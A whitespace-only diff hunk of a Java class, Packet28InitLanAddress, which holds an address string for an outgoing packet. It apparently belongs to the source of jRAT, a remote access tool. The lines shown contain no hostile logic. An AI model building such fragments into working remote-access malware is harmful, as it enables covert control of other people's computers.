@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet28InitLanAddress extends AbstractOutgoingPacket {
-	
+
 	private String address;
-	
+
 	public Packet28InitLanAddress(String address) {
 		this.address = address;
 	}
